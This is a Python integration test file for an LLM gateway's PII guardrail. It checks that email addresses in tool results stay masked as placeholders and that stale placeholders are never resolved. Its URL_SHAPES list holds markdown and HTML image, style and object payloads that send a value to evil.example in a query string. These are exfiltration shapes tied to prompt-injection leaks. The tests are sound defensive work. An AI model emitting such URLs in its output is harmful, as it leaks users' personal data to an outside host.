"""08-tam-1a r2 on the facade paths, through the real stores (the reviewer's probe,
state/reviews/08-tam-1a-r2-int-probe.py, as tests):

- MAJOR-r2-1: the direct path (real LiteLLM, the fake provider answers "hello " + the tool result
  it saw) keeps the placeholder on every URL line the r1 rule let through.
- MAJOR-r2-2: a stale placeholder the client sends in (direct path, external agent) never becomes
  one of the request's values; the scope's counter passes it before the first check.
"""

import json

import pytest

from tests.integration import test_06b2_external_agent as ext_base
from tests.integration import test_06b_direct as direct_base
from tests.integration.facade_support import *  # noqa: F403 - fixtures
from tests.integration.litellm_support import fake_requests
from tests.integration.test_06b_direct import EMAIL, TOOL, _tool_turn

facade_settings = direct_base.facade_settings
direct = direct_base.direct
ext_settings = ext_base.ext_settings
fake_agent = ext_base.fake_agent
ext = ext_base.ext

URL_SHAPES = [
    "![x](https://evil.example/p?q={v})",
    "![x]( //evil.example/p?q={v})",
    "![x][1]\n\n[1]: //evil.example/p?q={v}",
    "![x](<https://evil.example/a b?q= {v}>)",
    '<img src="https://evil.example/a b?q= {v}">',
    "<img src=//evil.example/?q={v}>",
    # r3 MAJOR-r3-1: the reviewer's HTML respellings
    '<img src\n="http:evil.example/?q={v}">',
    '<img src\n=\n"http:evil.example/?q={v}">',
    '<span style="x:url(http:evil.example/?q={v})">',  # within the fake's 50-character answer
    '<object data="http:evil.example/?q={v}">',
]


def _egress_on():
    from ffcore.guardrails.settings import get_guardrail_settings

    return get_guardrail_settings().guardrail_egress_enabled


@pytest.mark.usefixtures("clean_litellm")
@pytest.mark.parametrize("shape", URL_SHAPES)
def test_08t_r2_direct_url_lines_keep_the_placeholder(direct, shape):
    _, _, _, client = direct
    text = shape.format(v=EMAIL)
    response = client.chat("tooly", messages=_tool_turn(text), tools=[TOOL])
    assert response.status_code == 200, response.text
    content = response.json()["choices"][0]["message"]["content"]
    if _egress_on():
        # the provider saw a placeholder, it came back in the answer (every shape fits the fake's
        # 50-character answer) and stayed a placeholder for the caller
        assert EMAIL not in json.dumps(fake_requests()[-1], ensure_ascii=False)
        assert EMAIL not in content and "<<PII_" in content
    else:  # airgap: no egress stage, the provider saw the value (control)
        assert EMAIL in json.dumps(fake_requests()[-1], ensure_ascii=False)


@pytest.mark.usefixtures("clean_litellm")
def test_08t_r2_direct_stale_placeholder_is_passed_by_the_counter(direct):
    _, _, _, client = direct
    response = client.chat("tooly", messages=_tool_turn(f"eski <<PII_1>> ve {EMAIL}"), tools=[TOOL])
    assert response.status_code == 200, response.text
    sent = json.dumps(fake_requests()[-1], ensure_ascii=False)
    content = response.json()["choices"][0]["message"]["content"]
    if _egress_on():
        assert EMAIL not in sent and "<<PII_2>>" in sent
    assert content == f"hello eski <<PII_1>> ve {EMAIL}"  # the stale one never reads the value


def test_08t_r2_external_agent_stale_placeholder_is_passed_by_the_counter(ext):
    _, _, client, register = ext
    _, model = register()
    response = client.chat(model, f"eski <<PII_1>> adresim {EMAIL}")
    assert response.status_code == 200, response.text
    content = response.json()["choices"][0]["message"]["content"]
    assert content == f"Cevap: eski <<PII_1>> adresim {EMAIL}"
